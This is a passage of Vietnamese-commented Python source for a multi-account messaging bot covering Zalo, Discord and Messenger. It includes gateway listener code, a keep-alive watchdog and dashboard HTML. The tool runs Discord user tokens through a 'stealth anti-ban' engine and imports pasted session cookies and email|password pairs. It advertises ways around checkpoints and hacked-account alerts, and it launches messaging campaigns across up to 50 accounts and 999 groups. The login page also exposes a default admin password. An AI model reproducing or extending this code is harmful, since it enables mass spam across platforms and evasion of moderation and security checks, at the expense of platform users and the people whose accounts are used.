                                DiscordStealthAntiBanEngine.save_gateway_resume_state(
                                    client.token, session_id=sess_id, resume_url=res_url, last_seq=self.last_seq or 0
                                )
                            # Đăng ký OP 37 Guild Subscriptions Bulk để nhận MESSAGE_CREATE tức thì trên mọi Server
                            try:
                                subs_map = {}
                                for g_obj in (d_ev.get("guilds") or [])[:60]:
                                    if isinstance(g_obj, dict) and g_obj.get("id"):
                                        subs_map[str(g_obj["id"])] = {"typing": True, "threads": True, "activities": False}
                                if subs_map:
                                    op37_pkt = json.dumps({"op": 37, "d": {"subscriptions": subs_map}}).encode("utf-8")
                                    ZaloRealtimeListener._send_ws_frame(sock, op37_pkt, opcode=0x1)
                                for pc_obj in (d_ev.get("private_channels") or [])[:8]:
                                    if isinstance(pc_obj, dict) and pc_obj.get("id"):
                                        DiscordStealthAntiBanEngine.ACTIVE_DISCORD_POLL_CHANNELS[self.acc_id].add(str(pc_obj["id"]))
                            except Exception:
                                pass
                            self.ws_status = "NHK Discord Ghost Vault (0ms Toàn Kênh)"

                        elif op == 0 and t_ev == "RESUMED":
                            self.ws_status = "NHK Discord Ghost Vault (Resumed 0ms)"

                        elif op == 0 and t_ev in ("CHANNEL_CREATE", "THREAD_CREATE") and isinstance(d_ev, dict):
                            cid_new = str(d_ev.get("id") or "")
                            cname_new = d_ev.get("name") or f"Box #{cid_new[-5:]}"
                            if cid_new:
                                FullConversationAutoScanner.register_live_conversation(
                                    "discord", cid_new, f"[Auto-Soi] # {cname_new}", guild_id=str(d_ev.get("guild_id") or "")
                                )

                        elif op == 0 and t_ev == "MESSAGE_CREATE" and isinstance(d_ev, dict):
                            self.last_event_ts = time.time()
                            cid_m = str(d_ev.get("channel_id") or "")
                            if cid_m:
                                FullConversationAutoScanner.register_live_conversation(
                                    "discord", cid_m, f"[Active] Box #{cid_m[-5:]}", guild_id=str(d_ev.get("guild_id") or "")
                                )
                            self._handle_discord_message_event(client, acc_now, d_ev)

                        elif op == 1:
                            hb_pkt = json.dumps({"op": 1, "d": self.last_seq}).encode("utf-8")
                            ZaloRealtimeListener._send_ws_frame(sock, hb_pkt, opcode=0x1)
                            last_hb = time.time()

                        elif op == 9:
                            if not d_ev:
                                DiscordStealthAntiBanEngine.save_gateway_resume_state(client.token, "", "", 0)
                            self.stop_ev.wait(1.0)
                            break

                        elif op == 7:
                            break
                except socket.timeout:
                    continue
                except Exception:
                    break
        finally:
            try:
                sock.close()
            except Exception:
                pass

    def _run_loop(self):
        self.stop_ev.wait(0.15)
        while not self.stop_ev.is_set():
            acc_row = self._get_acc_row()
            if not acc_row or acc_row.get("platform") != "discord":
                break
            if not acc_row.get("chat_cmd_enabled", 1):
                self.ws_status = "Đã tắt nhận lệnh"
                self.stop_ev.wait(3.0)
                continue

            try:
                is_bot = bool(acc_row.get("is_bot", 0))
                client = DiscordClient(acc_row["token"], is_bot=is_bot)
                if not client.check(force_network=False):
                    self.ws_status = "Token cần kiểm tra lại"
                    self.stop_ev.wait(10.0)
                    continue

                if client.user_id and not acc_row.get("uid"):
                    try:
                        conn = db()
                        conn.execute("UPDATE accounts SET uid=? WHERE id=?", (client.user_id, self.acc_id))
                        conn.commit()
                        conn.close()
                    except Exception:
                        pass

                self._run_gateway_session(client, acc_row)
                self.stop_ev.wait(1.2)
            except Exception:
                self.ws_status = "Đang đồng bộ lại..."
                self.stop_ev.wait(2.0)

def sync_all_zalo_listeners():
    refresh_accounts_ram_cache()
    refresh_owner_uids()
    try:
        conn = db()
        rows = conn.execute("SELECT id, platform, chat_cmd_enabled, uid, imei, token FROM accounts ORDER BY id ASC").fetchall()
        conn.close()
        active_ids = set()
        seen_cred_keys = set()
        for r in rows:
            aid = r["id"]
            plat = (r["platform"] or "zalo").lower()
            if r["chat_cmd_enabled"]:
                cred_val = str(r["token"] if plat == "discord" else (r["uid"] or r["imei"] or aid)).strip()
                cred_key = f"{plat}:{cred_val}"
                if cred_val and cred_key in seen_cred_keys:
                    # Ngăn chặn tuyệt đối 2 bản ghi trùng cùng 1 tài khoản chạy 2 Listener gây nhân đôi .menu!
                    continue
                if cred_val:
                    seen_cred_keys.add(cred_key)
                active_ids.add(aid)
                lst = ACTIVE_LISTENERS.get(aid)
                need_start = (lst is None) or (not lst.thread.is_alive())
                if not need_start and plat in ("zalo", "discord") and hasattr(lst, "poller_thread"):
                    if not lst.poller_thread.is_alive():
                        need_start = True
                if need_start:
                    if lst is not None:
                        try:
                            lst.stop()
                        except Exception:
                            pass
                    if plat == "discord":
                        listener = DiscordRealtimeListener(aid)
                    elif plat == "messenger":
                        listener = MessengerRealtimeListener(aid)
                    else:
                        listener = ZaloRealtimeListener(aid)
                    ACTIVE_LISTENERS[aid] = listener
                    listener.start()
        for aid in list(ACTIVE_LISTENERS.keys()):
            if aid not in active_ids:
                ACTIVE_LISTENERS[aid].stop()
                ACTIVE_LISTENERS.pop(aid, None)
    except Exception:
        pass


# Các hàm bí danh tương thích hoàn toàn với get_ck_im_zalo.py
TASKS = TASKS_RAM_STORE
TASKS_LOCK = TASKS_RAM_LOCK


def reload_accounts_to_ram():
    refresh_accounts_ram_cache()
    refresh_owner_uids()


def ensure_account_listener(acc_row=None):
    sync_all_zalo_listeners()

def _flush_ram_tasks_to_db():
    try:
        to_insert = []
        to_update = []
        with TASKS_RAM_LOCK:
            if len(TASKS_RAM_STORE) > 150:
                sorted_keys = sorted(TASKS_RAM_STORE.keys(), key=lambda k: TASKS_RAM_STORE[k].get("started_at", 0))
                for old_k in sorted_keys[:-100]:
                    if TASKS_RAM_STORE[old_k].get("status") != "running":
                        TASKS_RAM_STORE.pop(old_k, None)
            for tid, t_obj in list(TASKS_RAM_STORE.items()):
                if not t_obj.get("dirty"):
                    continue
                t_obj["dirty"] = False
                stats_json = json.dumps({"sent": t_obj.get("sent", 0), "fail": t_obj.get("fail", 0)})
                if not t_obj.get("persisted"):
                    t_obj["persisted"] = True
                    meta_json = json.dumps(t_obj.get("meta") or {}, ensure_ascii=False)
                    to_insert.append((tid, t_obj.get("type", "treo_nhay"), meta_json, t_obj.get("status", "running"), t_obj.get("started_at", time.time()), stats_json))
                else:
                    to_update.append((t_obj.get("status", "running"), stats_json, tid))
        if to_insert or to_update:
            conn = db()
            if to_insert:
                conn.executemany(
                    "INSERT OR REPLACE INTO tasks (id, type, meta, status, started_at, stats) VALUES (?, ?, ?, ?, ?, ?)",
                    to_insert
                )
            if to_update:
                conn.executemany(
                    "UPDATE tasks SET status = ?, stats = ? WHERE id = ?",
                    to_update
                )
            conn.commit()
    except Exception:
        pass

def _init_ram_stores_from_db():
    try:
        refresh_accounts_ram_cache()
        conn = db()
        t_rows = conn.execute("SELECT * FROM tasks ORDER BY started_at DESC LIMIT 80").fetchall()
        l_rows = conn.execute("SELECT * FROM bot_logs ORDER BY id DESC LIMIT 30").fetchall()
        conn.close()
        with TASKS_RAM_LOCK:
            for r in t_rows:
                tid = r["id"]
                try:
                    meta = json.loads(r["meta"] or "{}")
                except Exception:
                    meta = {}
                try:
                    st_d = json.loads(r["stats"] or "{}")
                except Exception:
                    st_d = {}
                TASKS_RAM_STORE[tid] = {
                    "id": tid,
                    "type": r["type"] or "treo_nhay",
                    "meta": meta,
                    "status": "stopped" if tid not in ACTIVE_TASKS else "running",
                    "started_at": float(r["started_at"] or 0),
                    "sent": int(st_d.get("sent", 0)),
                    "fail": int(st_d.get("fail", 0)),
                    "delay": float(meta.get("delay", 1.0)),
                    "dirty": False,
                    "persisted": True,
                }
        for lr in reversed(l_rows):
            BOT_LOGS_RAM_DEQUE.appendleft(dict(lr))
    except Exception:
        pass

def _listener_watchdog_loop():
    global _TELEGRAM_BOT_RUNNER
    _init_ram_stores_from_db()
    try:
        from zalo_login import ZaloPCSessionKeeper
        ZaloPCSessionKeeper.ensure_vault_daemon_started(DB_PATH)
    except Exception:
        pass
    time.sleep(0.5)
    step_c = 0
    while True:
        try:
            _flush_ram_tasks_to_db()
            _sync_epochs_from_db_background()
            if step_c % 2 == 0:
                sync_all_zalo_listeners()
            # Giám sát & tự động hồi sinh Bot Telegram nếu mạng đứt hoặc socket getUpdates bị treo > 45s
            if step_c % 3 == 0 and os.environ.get("DISABLE_TELEGRAM_BOT", "0") != "1":
                try:
                    import get_ck_im_zalo as _tg_mod
                    bot_inst = getattr(_tg_mod, "_BOT_INSTANCE", None) or _TELEGRAM_BOT_RUNNER
                    now_w = time.time()
                    if bot_inst is None or not getattr(bot_inst, "running", False):
                        _TELEGRAM_BOT_RUNNER = _tg_mod.start_background_telegram_bot(TELEGRAM_BOT_TOKEN, force_restart=True)
                    else:
                        last_ok = float(getattr(bot_inst, "last_poll_ok_ts", now_w) or now_w)
                        poll_thr = getattr(bot_inst, "poll_thread", None)
                        if (now_w - last_ok > 48.0) or (poll_thr is not None and not poll_thr.is_alive()):
                            _TELEGRAM_BOT_RUNNER = _tg_mod.start_background_telegram_bot(TELEGRAM_BOT_TOKEN, force_restart=True)
                except Exception:
                    pass
            if step_c % 12 == 0:
                try:
                    from zalo_login import ZaloPCSessionKeeper
                    ZaloPCSessionKeeper.restore_all_from_db(DB_PATH)
                except Exception:
                    pass
                # Giải phóng bộ nhớ định kỳ giúp Render Free (512MB RAM) chạy 50+ Acc mượt mà không tốn GB
                if len(DiscordClient._DISCORD_MSG_FORMAT_CACHE) > 1200:
                    DiscordClient._DISCORD_MSG_FORMAT_CACHE.clear()
                if len(Zalo._ZALO_ADV_FORMAT_CACHE) > 1200:
                    Zalo._ZALO_ADV_FORMAT_CACHE.clear()
                gc.collect()
            # Self-Ping giữ thức máy chủ Render 24/7 (mỗi 90s) để treo xuyên đêm không bao giờ ngủ đông
            if step_c % 30 == 0 and step_c > 0:
                def _self_keepalive_ping():
                    try:
                        ext_url = (os.environ.get("RENDER_EXTERNAL_URL") or "").strip().rstrip("/")
                        if ext_url:
                            requests.get(f"{ext_url}/api/network/gateways", timeout=5)
                        else:
                            port_loc = int(os.environ.get("PORT", 5000))
                            requests.get(f"http://127.0.0.1:{port_loc}/api/network/gateways", timeout=3)
                    except Exception:
                        pass
                threading.Thread(target=_self_keepalive_ping, daemon=True).start()
            step_c += 1
        except Exception:
            pass
        time.sleep(3.0)

threading.Thread(target=_listener_watchdog_loop, daemon=True).start()

# -*- coding: utf-8 -*-
import math

class TelegramPetAnimationEngine:
    @classmethod
    def get_corgi_svg(cls):
        return ""
    @classmethod
    def get_cat_svg(cls):
        return ""
    @classmethod
    def get_nhk_3d_emblem_svg(cls):
        return ""
    @classmethod
    def get_pet_bundle(cls):
        return {"ok": True}


class TelegramUIPhysicsEngine:
    @classmethod
    def get_ui_bundle(cls):
        return {"version": "telegram-only-v2026"}


class MessagingGatewayDirectory:
    @classmethod
    def get_directory_payload(cls):
        return {"ok": True, "mode": "telegram_bot_controller"}


LOGIN_HTML = r"""<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{{ custom_title or 'Đăng Nhập Hệ Thống Điều Phối Đa Tài Khoản 4APP VIP' }}</title>
<style>
:root{--bg:#0b0f19;--card:#131b2e;--border:#26334d;--text:#f0f6fc;--muted:#94a3b8;--accent:#3b82f6;--success:#10b981;--danger:#ef4444}
*{box-sizing:border-box}
body{margin:0;background:radial-gradient(circle at top,#172554 0%,#0b0f19 65%);color:var(--text);font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh;padding:20px}
.login-card{background:var(--card);border:1px solid var(--border);border-radius:20px;padding:36px 32px;width:100%;max-width:440px;box-shadow:0 20px 50px rgba(0,0,0,0.55)}
.badge{display:inline-flex;align-items:center;gap:6px;background:rgba(16,185,129,0.15);color:#34d399;border:1px solid rgba(16,185,129,0.35);padding:6px 14px;border-radius:999px;font-size:13px;font-weight:700;margin-bottom:16px}
h1{font-size:24px;font-weight:800;margin:0 0 8px;color:#60a5fa;letter-spacing:-0.3px}
p.sub{font-size:14.5px;color:var(--muted);line-height:1.55;margin:0 0 24px}
.form-group{margin-bottom:18px;text-align:left}
label{display:block;font-size:14px;font-weight:600;margin-bottom:8px;color:#cbd5e1}
input[type="password"]{width:100%;padding:13px 16px;font-size:15px;border-radius:12px;border:1px solid var(--border);background:#090d16;color:var(--text);outline:none;transition:border-color 0.2s}
input[type="password"]:focus{border-color:var(--accent)}
.btn{width:100%;padding:13px 18px;font-size:15px;font-weight:700;border:none;border-radius:12px;background:linear-gradient(135deg,#2563eb,#1d4ed8);color:#fff;cursor:pointer;transition:transform 0.15s,opacity 0.15s}
.btn:hover{opacity:0.95;transform:translateY(-1px)}
.err{background:rgba(239,68,68,0.15);border:1px solid rgba(239,68,68,0.4);color:#fca5a5;padding:12px 14px;border-radius:12px;font-size:14px;margin-bottom:16px;font-weight:600}
.quick-link{display:inline-block;margin-top:16px;font-size:13.5px;color:#93c5fd;text-decoration:none}
</style>
</head>
<body>
<div class="login-card">
  <div class="badge">● AUTHOR: DEV ANH KHÔI • v2026.9.0 ULTRA VIP</div>
  <h1>BOT TREO 4APP 🇻🇳 — DEV ANH KHÔI</h1>
  <p class="sub">Hệ thống điều phối Đa Tài Khoản Zalo • Discord • Messenger & Tạo Nhãn Dán Sticker Chuẩn Zalo.</p>
  {% if error %}
  <div class="err">⚠️ {{ error }}</div>
  {% endif %}
  <form method="POST" action="/login">
    <div class="form-group">
      <label>🔑 Mật khẩu Quản Trị Viên:</label>
      <input type="password" name="password" placeholder="Nhập khóa truy cập (mặc định: anhba)..." required autofocus>
    </div>
    <button type="submit" class="btn">🚀 Đăng Nhập Bảng Điều Khiển</button>
  </form>
  <a class="quick-link" href="/">👉 Vào thẳng Bảng Điều Khiển Nhanh</a>
</div>
</body>
</html>"""

DASHBOARD_HTML = r"""<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>{{ custom_title or 'BẢNG ĐIỀU KHIỂN ĐA TÀI KHOẢN 4APP VIP 🇻🇳' }}</title>
<style>
:root{
  --bg:#0b0f19;
  --panel:#131b2e;
  --panel-alt:#182238;
  --border:#283655;
  --text:#f8fafc;
  --text-soft:#cbd5e1;
  --muted:#94a3b8;
  --primary:#3b82f6;
  --primary-hover:#2563eb;
  --success:#10b981;
  --warning:#f59e0b;
  --danger:#ef4444;
  --purple:#8b5cf6;
}
*{box-sizing:border-box}
body{
  margin:0;
  background:var(--bg);
  color:var(--text);
  font-family:'Inter',-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;
  font-size:15px;
  line-height:1.55;
}
.topbar{
  background:rgba(19,27,46,0.95);
  border-bottom:1px solid var(--border);
  padding:14px 24px;
  position:sticky;
  top:0;
  z-index:100;
  display:flex;
  flex-wrap:wrap;
  align-items:center;
  justify-content:space-between;
  gap:14px;
  backdrop-filter:blur(10px);
}
.brand{display:flex;align-items:center;gap:12px}
.brand-badge{
  background:linear-gradient(135deg,#2563eb,#7c3aed);
  color:#fff;
  font-weight:800;
  font-size:16px;
  padding:8px 14px;
  border-radius:12px;
  letter-spacing:0.5px;
}
.brand-title h1{font-size:18px;font-weight:800;margin:0;color:#fff}
.brand-title p{font-size:13px;color:var(--muted);margin:2px 0 0}
.stats-pills{display:flex;flex-wrap:wrap;gap:10px;align-items:center}
.pill{
  background:var(--panel-alt);
  border:1px solid var(--border);
  padding:7px 14px;
  border-radius:999px;
  font-size:13.5px;
  font-weight:600;
  color:var(--text-soft);
}
.pill b{color:#60a5fa}
.pill.ok b{color:#34d399}
.container{max-width:1440px;margin:0 auto;padding:22px}
.grid-2{display:grid;grid-template-columns:1fr 1fr;gap:20px;margin-bottom:20px}
@media(max-width:1024px){.grid-2{grid-template-columns:1fr}}
.card{
  background:var(--panel);
  border:1px solid var(--border);
  border-radius:16px;
  padding:20px 22px;
  box-shadow:0 10px 28px rgba(0,0,0,0.35);
}
.card-header{
  display:flex;
  flex-wrap:wrap;
  align-items:center;
  justify-content:space-between;
  gap:10px;
  margin-bottom:16px;
  padding-bottom:12px;
  border-bottom:1px solid var(--border);
}
.card-header h2{
  font-size:17px;
  font-weight:800;
  margin:0;
  color:#93c5fd;
  display:flex;
  align-items:center;
  gap:8px;
}
.btn-row{display:flex;flex-wrap:wrap;gap:8px;align-items:center}
button,.btn{
  font-family:inherit;
  font-size:14px;
  font-weight:700;
  padding:9px 15px;
  border-radius:10px;
  border:1px solid transparent;
  cursor:pointer;
  transition:all 0.15s;
  display:inline-flex;
  align-items:center;
  justify-content:center;
  gap:6px;
  text-decoration:none;
}
.btn-primary{background:var(--primary);color:#fff}
.btn-primary:hover{background:var(--primary-hover)}
.btn-success{background:var(--success);color:#052e16}
.btn-success:hover{filter:brightness(1.08)}
.btn-danger{background:var(--danger);color:#fff}
.btn-danger:hover{filter:brightness(1.08)}
.btn-warning{background:var(--warning);color:#1e1b4b}
.btn-outline{background:var(--panel-alt);color:var(--text);border-color:var(--border)}
.btn-outline:hover{border-color:#60a5fa;color:#60a5fa}
.btn-sm{padding:6px 11px;font-size:13px;border-radius:8px}
input[type="text"],input[type="number"],select,textarea{
  width:100%;
  padding:11px 14px;
  font-size:14.5px;
  font-family:inherit;
  color:var(--text);
  background:#090d16;
  border:1px solid var(--border);
  border-radius:10px;
  outline:none;
}
input:focus,select:focus,textarea:focus{border-color:var(--primary)}
label.field-lbl{display:block;font-size:13.5px;font-weight:700;color:var(--text-soft);margin:10px 0 6px}
.scroll-list{
  max-height:310px;
  overflow-y:auto;
  border:1px solid var(--border);
  border-radius:12px;
  background:#090d16;
  padding:8px;
}
.list-item{
  display:flex;
  align-items:center;
  justify-content:space-between;
  gap:10px;
  padding:10px 12px;
  border-bottom:1px solid rgba(40,54,85,0.55);
  border-radius:8px;
  font-size:14px;
}
.list-item:last-child{border-bottom:none}
.list-item:hover{background:rgba(59,130,246,0.08)}
.item-left{display:flex;align-items:center;gap:10px;min-width:0}
.item-title{font-weight:700;color:#fff;white-space:nowrap;overflow:hidden;text-overflow:ellipsis}
.item-sub{font-size:12.5px;color:var(--muted)}
.tag-plat{
  font-size:11.5px;
  font-weight:800;
  padding:3px 8px;
  border-radius:6px;
  text-transform:uppercase;
}
.tag-zalo{background:rgba(59,130,246,0.2);color:#60a5fa;border:1px solid rgba(59,130,246,0.4)}
.tag-discord{background:rgba(139,92,246,0.2);color:#c4b5fd;border:1px solid rgba(139,92,246,0.4)}
.tag-messenger{background:rgba(14,165,233,0.2);color:#7dd3fc;border:1px solid rgba(14,165,233,0.4)}
.toast-bar{
  display:none;
  margin-bottom:18px;
  padding:13px 18px;
  border-radius:12px;
  background:rgba(16,185,129,0.18);
  border:1px solid rgba(16,185,129,0.45);
  color:#6ee7b7;
  font-weight:700;
  font-size:14.5px;
}
.table-wrap{overflow-x:auto}
table{width:100%;border-collapse:collapse;font-size:14px}
th,td{padding:11px 12px;text-align:left;border-bottom:1px solid var(--border)}
th{color:#93c5fd;font-weight:800;background:var(--panel-alt)}
.qr-box{
  display:none;
  margin-top:14px;
  padding:16px;
  background:#090d16;
  border:1px dashed #60a5fa;
  border-radius:14px;
  text-align:center;
}
.qr-box img{max-width:240px;border-radius:12px;border:6px solid #fff;margin:10px auto;display:block}
</style>
</head>
<body>
<div class="topbar">
  <div class="brand">
    <div class="brand-badge">DEV ANH KHÔI • v2026.10.0 ZALO PRO</div>
    <div class="brand-title">
      <h1>HỆ THỐNG CHUYÊN ZALO ĐA COOKIE ĐỘC LẬP & STUDIO STICKER API (v2026.10.0 Ultra VIP)</h1>
      <p>👨‍💻 Author: <b>Dev Anh Khôi</b> • Cookie Nào Tự Sài Cookie Ấy Không Chồng Chéo • API Sticker Zalo • Giải Tán Không Cần Key</p>
    </div>
  </div>
  <div class="stats-pills">
    <div class="pill ok">🟢 Acc Kết Nối: <b id="stat-accs">{{ accounts|length }}</b></div>
    <div class="pill">🚀 Chiến Dịch Đang Chạy: <b id="stat-tasks">0</b></div>
    <div class="pill">⚡ Tốc Độ Gửi: <b id="stat-rpm">0</b> tin/phút</div>
    <button class="btn btn-danger btn-sm" onclick="stopAllTasks()">🛑 DỪNG TẤT CẢ (.ta)</button>
  </div>
</div>

<div class="container">
  <div id="toast-box" class="toast-bar"></div>

  <!-- HÀNG 1: QUẢN LÝ ĐA TÀI KHOẢN & QUÉT CHỌN NHÓM/BOX -->
  <div class="grid-2">
    <!-- CỘT 1: QUẢN LÝ ĐA TÀI KHOẢN -->
    <div class="card">
      <div class="card-header">
        <h2>👥 1. Quản Lý & Chọn Đa Tài Khoản (<span id="sel-acc-count">Tất cả</span>)</h2>
        <div class="btn-row">
          <button class="btn btn-primary btn-sm" onclick="startZaloQR()">📲 Quét QR Zalo PC</button>
          <button class="btn btn-success btn-sm" onclick="checkAllLive()">🔍 Check Sống/Die</button>
          <button class="btn btn-outline btn-sm" onclick="reconnectAll()">🔄 Kết Nối Lại</button>
        </div>
      </div>

      <!-- Chọn nhanh số lượng Acc -->
      <div class="btn-row" style="margin-bottom:10px">
        <span style="font-size:13px;color:var(--muted);font-weight:700">Chọn nhanh:</span>
        <button class="btn btn-outline btn-sm" onclick="selectTopAccounts(1)">1 Acc</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopAccounts(5)">5 Acc</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopAccounts(10)">10 Acc</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopAccounts(20)">20 Acc</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopAccounts(50)">50 Acc</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopAccounts(999)">✅ Tất Cả Acc</button>
        <button class="btn btn-outline btn-sm" onclick="bulkToggleCmd(true)">💬 Bật Lệnh Tất Cả</button>
      </div>

      <!-- Khung hiển thị QR Zalo PC trực tiếp -->
      <div id="qr-modal" class="qr-box">
        <div style="font-weight:800;color:#60a5fa" id="qr-status-txt">⏳ Đang khởi tạo mã QR Máy Tính Singapore...</div>
        <img id="qr-img" src="" alt="Zalo QR" style="display:none">
        <div style="font-size:13px;color:var(--muted)">Mở Zalo trên điện thoại ➔ Quét mã QR ➔ Tự động nạp vào danh sách Acc!</div>
      </div>

      <!-- Danh sách tài khoản -->
      <div class="scroll-list" id="acc-list-container">
        {% if accounts %}
          {% for a in accounts %}
          <div class="list-item">
            <div class="item-left">
              <input type="checkbox" class="acc-chk" value="{{ a.id }}" checked onchange="updateSelectedCounts()" style="width:18px;height:18px;cursor:pointer">
              <span class="tag-plat tag-{{ a.platform or 'zalo' }}">{{ a.platform or 'zalo' }}</span>
              <div>
                <div class="item-title">#{{ a.id }} — {{ a.name }}</div>
                <div class="item-sub">UID: <code>{{ a.uid or a.imei or '-' }}</code> • Lệnh chat: <b style="color:{{ '#34d399' if a.chat_cmd_enabled else '#f87171' }}">{{ 'BẬT' if a.chat_cmd_enabled else 'TẮT' }}</b></div>
              </div>
            </div>
            <div class="btn-row">
              <button class="btn btn-outline btn-sm" onclick="testSingleAcc({{ a.id }})">Check</button>
              <button class="btn btn-outline btn-sm" onclick="toggleSingleCmd({{ a.id }}, {{ 0 if a.chat_cmd_enabled else 1 }})">{{ 'Tắt Lệnh' if a.chat_cmd_enabled else 'Bật Lệnh' }}</button>
              <a class="btn btn-danger btn-sm" href="/account/delete/{{ a.id }}" onclick="return confirm('Xoá tài khoản #{{ a.id }}?')">Xoá</a>
            </div>
          </div>
          {% endfor %}
        {% else %}
          <div style="padding:18px;text-align:center;color:var(--muted)">Chưa có tài khoản nào. Hãy bấm <b>📲 Quét QR Zalo PC</b> hoặc thêm Cookie + IMEI bên dưới!</div>
        {% endif %}
      </div>

      <!-- Khung 1: Nạp Nhanh Cookie Zalo (Tự nhận IMEI + Khóa Phiên + Bật Lệnh Độc Lập Ngay) -->
      <div style="margin-top:14px;background:var(--panel-alt);padding:14px;border-radius:12px;border:1px solid rgba(59,130,246,0.45)">
        <div style="font-weight:800;color:#60a5fa;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center">
          <span>🍪 1. Nạp Nhanh Cookie Zalo (Tự Nhận IMEI & Ăn Lệnh .menu Ngay)</span>
          <span style="font-size:12px;color:#34d399">Cô lập riêng từng Cookie</span>
        </div>
        <div class="grid-2" style="gap:8px;margin-bottom:8px">
          <input type="text" id="fast-zalo-name" placeholder="Tên gợi nhớ (VD: Acc Zalo Chính)">
          <input type="text" id="fast-zalo-imei" placeholder="IMEI (z_uuid) — Có thể để trống, tự nhận diện!">
        </div>
        <div style="display:flex;gap:8px">
          <input type="text" id="fast-zalo-cookie" placeholder="Dán Cookie Zalo (zpw_sek / zpsid / JSON / Cookie|IMEI) vào đây...">
          <button type="button" class="btn btn-success" onclick="quickAddZaloCookie()" style="white-space:nowrap">⚡ Nạp Zalo</button>
        </div>
      </div>

      <!-- Khung 2: Nạp Nhanh Cookie Facebook (Tự Lấy Máy Tính Thông Báo Vào Facebook Chống Quét Checkpoint) -->
      <div style="margin-top:10px;background:var(--panel-alt);padding:14px;border-radius:12px;border:1px solid rgba(14,165,233,0.45)">
        <div style="font-weight:800;color:#38bdf8;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center">
          <span>💻 2. Nạp Cookie Facebook (Lấy Máy Tính Thông Báo Vào FB Chống Quét)</span>
          <span style="font-size:12px;color:#34d399">Anti-Reg & Anti-Hack Active</span>
        </div>
        <div style="display:flex;gap:8px">
          <input type="text" id="fast-fb-name" placeholder="Tên FB (Tùy chọn)" style="max-width:165px">
          <input type="text" id="fast-fb-cookie" placeholder="Dán Cookie Facebook (c_user=...; xs=...) hoặc JSON vào đây...">
          <button type="button" class="btn btn-primary" onclick="quickAddFacebookCookie()" style="white-space:nowrap">💻 Nạp FB & Báo Máy Tính</button>
        </div>
      </div>

      <!-- Khung 3: Đúc Token & Anti-Reg Acc Discord (Chống Báo Tài Khoản Bị Hack / Đặt Lại Mật Khẩu) -->
      <div style="margin-top:10px;background:var(--panel-alt);padding:14px;border-radius:12px;border:1px solid rgba(139,92,246,0.45)">
        <div style="font-weight:800;color:#c4b5fd;margin-bottom:8px;display:flex;justify-content:space-between;align-items:center">
          <span>🛡️ 3. Đúc Token & Anti-Reg Acc Discord (Chống Báo Hack / Reset Key)</span>
          <span style="font-size:12px;color:#34d399">Chrome 131 PC Vault</span>
        </div>
        <div style="display:flex;gap:8px">
          <input type="text" id="fast-dc-name" placeholder="Tên Discord" style="max-width:150px">
          <input type="text" id="fast-dc-token" placeholder="Dán 1 hoặc nhiều Token Discord (hoặc Email|Pass) vào đây...">
          <button type="button" class="btn btn-warning" onclick="quickAddDiscordToken()" style="white-space:nowrap">🛡️ Đúc Token Discord</button>
        </div>
      </div>

      <!-- Form mở rộng cho Discord / Messenger -->
      <details style="margin-top:10px">
        <summary style="cursor:pointer;font-weight:700;color:var(--muted);padding:4px 0;font-size:13.5px">➕ Thêm Tài Khoản Phụ (Discord Token / Messenger Cookie)</summary>
        <form method="POST" action="/account/add" style="margin-top:8px;background:var(--panel-alt);padding:12px;border-radius:12px;border:1px solid var(--border)">
          <div class="grid-2" style="margin-bottom:8px;gap:8px">
            <select name="platform" id="add-plat-sel">
              <option value="zalo">Zalo PC (Cookie + IMEI)</option>
              <option value="discord">Discord (Token)</option>
              <option value="messenger">Facebook Messenger (Cookie)</option>
            </select>
            <input type="text" name="name" placeholder="Tên gợi nhớ">
          </div>
          <input type="text" name="imei" placeholder="IMEI Zalo (nếu có)" style="margin-bottom:8px">
          <input type="text" name="cookies" placeholder="Cookie Zalo / Messenger..." style="margin-bottom:8px">
          <input type="text" name="token" placeholder="Token Discord...">
          <input type="hidden" name="chat_cmd_enabled" value="1">
          <button type="submit" class="btn btn-primary btn-sm" style="width:100%;margin-top:10px">➕ Lưu Tài Khoản</button>
        </form>
      </details>
    </div>

    <!-- CỘT 2: QUÉT & CHỌN NHÓM / BOX MỤC TIÊU -->
    <div class="card">
      <div class="card-header">
        <h2>📦 2. Chọn Nhóm / Box Mục Tiêu (<span id="sel-box-count">0 Box</span>)</h2>
        <div class="btn-row">
          <button class="btn btn-primary btn-sm" onclick="scanBoxes('zalo', true)">🔄 Quét Nhóm Zalo</button>
          <button class="btn btn-outline btn-sm" onclick="scanBoxes('discord', true)">Quét Kênh Discord</button>
          <button class="btn btn-outline btn-sm" onclick="scanBoxes('messenger', true)">Quét Box Messenger</button>
        </div>
      </div>

      <div class="btn-row" style="margin-bottom:10px">
        <span style="font-size:13px;color:var(--muted);font-weight:700">Chọn nhanh:</span>
        <button class="btn btn-outline btn-sm" onclick="selectTopBoxes(1)">1 Box</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopBoxes(5)">5 Box</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopBoxes(10)">10 Box</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopBoxes(20)">20 Box</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopBoxes(50)">50 Box</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopBoxes(999)">✅ Tất Cả Box</button>
        <button class="btn btn-outline btn-sm" onclick="selectTopBoxes(0)">Bỏ Chọn</button>
      </div>

      <div style="display:flex;gap:8px;margin-bottom:10px">
        <input type="text" id="box-search-inp" placeholder="🔍 Tìm kiếm tên nhóm hoặc nhập trực tiếp ID Box..." oninput="filterBoxList()">
        <button class="btn btn-outline btn-sm" onclick="addManualBoxId()">+ Thêm ID</button>
      </div>

      <div class="scroll-list" id="box-list-container">
        <div style="padding:18px;text-align:center;color:var(--muted)">Đang tự động tải danh sách Nhóm Zalo... Bấm <b>🔄 Quét Nhóm Zalo</b> để làm mới!</div>
      </div>
    </div>
  </div>

